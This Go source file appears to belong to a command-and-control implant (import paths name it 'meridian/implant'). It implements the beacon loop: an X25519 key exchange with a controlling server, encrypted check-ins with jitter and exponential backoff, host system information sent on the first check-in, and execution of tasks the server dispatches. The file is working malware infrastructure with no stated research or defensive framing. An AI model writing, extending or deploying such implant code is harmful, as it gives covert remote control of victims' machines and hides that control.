// Package mbeacon implements the beacon loop: kex, periodic checkins,
// task execution and backoff.
package mbeacon

import (
	"crypto/ecdh"
	"crypto/rand"
	"encoding/json"
	"log"
	mrand "math/rand"
	"sync"
	"time"

	"meridian/implant/internal/mcrypto"
	"meridian/implant/internal/mproto"
	"meridian/implant/internal/msysinfo"
	"meridian/implant/internal/mtasks"
	"meridian/implant/internal/mtransport"
)

const maxBackoff = 3600 * time.Second

// Beacon drives one implant instance.
type Beacon struct {
	transports []mtransport.Transport
	interval   time.Duration
	jitter     float64
	verbose    bool

	mu      sync.Mutex
	results []mproto.Result
	stopped bool
}

// New builds a beacon. intervalSeconds and jitter are the requested profile
// (overridden by the server on KEX unless zero).
func New(transports []mtransport.Transport, intervalSeconds int, jitter float64, verbose bool) *Beacon {
	return &Beacon{
		transports: transports,
		interval:   time.Duration(intervalSeconds) * time.Second,
		jitter:     jitter,
		verbose:    verbose,
	}
}

func (b *Beacon) logf(format string, args ...any) {
	if b.verbose {
		log.Printf(format, args...)
	}
}

// nextSleep returns the delay before the next checkin. On failures the base
// interval doubles (bounded by maxBackoff) for backoff.
func (b *Beacon) nextSleep(fails int) time.Duration {
	if fails > 0 {
		d := b.interval * time.Duration(1<<min(fails, 10))
		if d > maxBackoff {
			d = maxBackoff
		}
		return d
	}
	j := 0.0
	if b.jitter > 0 {
		j = mrand.Float64() * b.jitter
	}
	return b.interval + time.Duration(float64(b.interval)*j)
}

// kex performs the handshake on the first transport that succeeds.
func (b *Beacon) kex() (*mcrypto.Session, error) {
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, err
	}
	clientNonce := make([]byte, mcrypto.SaltLen)
	if _, err := rand.Read(clientNonce); err != nil {
		return nil, err
	}
	clientPubB64 := mcrypto.B64(priv.PublicKey().Bytes())
	clientNonceB64 := mcrypto.B64(clientNonce)
	var lastErr error
	for _, t := range b.transports {
		reply, err := t.Kex(clientPubB64, clientNonceB64)
		if err != nil {
			lastErr = err
			b.logf("kex via %s failed: %v", t.Name(), err)
			continue
		}
		if reply.Interval > 0 {
			b.interval = time.Duration(reply.Interval) * time.Second
		}
		if reply.Jitter >= 0 {
			b.jitter = reply.Jitter
		}
		key, err := mcrypto.DeriveKey(priv, reply.ServerPub, clientNonceB64, reply.ServerNonce)
		if err != nil {
			return nil, err
		}
		sess, err := mcrypto.New(reply.SessionID, key)
		if err != nil {
			return nil, err
		}
		b.logf("kex ok via %s sid=%s", t.Name(), reply.SessionID[:8])
		return sess, nil
	}
	return nil, lastErr
}

// Run blocks forever, beaconing until Stop.
func (b *Beacon) Run() {
	meta := msysinfo.Collect()
	sess, err := b.kex()
	if err != nil {
		b.logf("kex failed: %v", err)
	}
	first := sess != nil
	fails := 0
	for {
		if sess == nil {
			sess, err = b.kex()
			if err != nil {
				b.logf("re-kex failed: %v", err)
			} else {
				first = true
				fails = 0
			}
		}
		if sess != nil {
			b.mu.Lock()
			res := b.results
			b.results = nil
			b.mu.Unlock()

			payload := mproto.NewCheckinBody(res, metaIf(first, meta))
			if err := b.checkin(sess, payload); err != nil {
				b.logf("checkin failed: %v", err)
				fails++
				sess = nil // drop key material; kex again next iteration
			} else {
				fails = 0
				first = false
			}
		}
		if b.isStopped() {
			return
		}
		time.Sleep(b.nextSleep(fails))
	}
}

// checkin pushes the payload and runs any dispatched tasks.
func (b *Beacon) checkin(sess *mcrypto.Session, payload []byte) error {
	env, err := sess.Seal(payload)
	if err != nil {
		return err
	}
	var lastErr error
	for _, t := range b.transports {
		replyEnv, err := t.Checkin(sess.SessionID, env)
		if err != nil {
			lastErr = err
			b.logf("checkin via %s failed: %v", t.Name(), err)
			continue
		}
		pt, err := sess.Open(replyEnv["nonce"], replyEnv["ct"])
		if err != nil {
			lastErr = err
			continue
		}
		var reply mproto.CheckinReply
		if err := json.Unmarshal(pt, &reply); err != nil {
			lastErr = err
			continue
		}
		b.runTasks(reply.Tasks)
		b.logf("checkin ok via %s (%d tasks)", t.Name(), len(reply.Tasks))
		return nil
	}
	return lastErr
}

func (b *Beacon) runTasks(tasks []mproto.Task) {
	for _, t := range tasks {
		r := mtasks.Run(t, b.stop)
		b.mu.Lock()
		b.results = append(b.results, r)
		b.mu.Unlock()
		b.logf("task %s %s -> %s", t.ID[:8], t.Module, r.Status)
	}
}

func (b *Beacon) stop() {
	b.mu.Lock()
	b.stopped = true
	b.mu.Unlock()
}

func (b *Beacon) isStopped() bool {
	b.mu.Lock()
	defer b.mu.Unlock()
	return b.stopped
}

func metaIf(first bool, meta map[string]any) map[string]any {
	if first {
		return meta
	}
	return nil
}
